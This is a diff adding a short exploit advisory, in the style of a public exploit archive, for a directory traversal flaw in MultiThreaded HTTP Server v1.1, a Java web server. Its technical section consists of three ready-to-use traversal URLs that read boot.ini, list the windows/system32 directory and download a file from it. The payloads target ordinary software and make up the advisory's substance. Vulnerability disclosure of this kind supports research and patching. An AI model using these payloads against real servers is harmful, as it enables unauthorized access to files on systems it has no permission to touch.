@@ -1,0 +1,21 @@
+###################################################################
+#
+# Exploit Title: MultiThreaded HTTP Server v1.1 Directory Traversal
+# Found By:	Dr_IDE
+# Date: 	Apr. 20, 2010
+# Download:	http://voxel.dl.sourceforge.net/project/http/version1.1/%5BUnnamed%20release%5D/HTTPProject_fat.jar
+# Tested on:	Windows 7
+#
+###################################################################
+
+- Description -
+
+MultiThreaded HTTP Server v1.1 is a Java based HTTP server. This is the latest
+version of the application available.
+
+MultiThreaded HTTP Server is vulnerable to remote directory traversal attacks. 
+
+- Technical Details -
+http://[ webserver IP][:port]/[?]../../../../../boot.ini	 		[File Access]
+http://[ webserver IP][:port]/[?]../../../../../windows/system32 		[Full Directory Listing]
+http://[ webserver IP][:port]/[?]../../../../../windows/system32/calc.exe	[File Download]
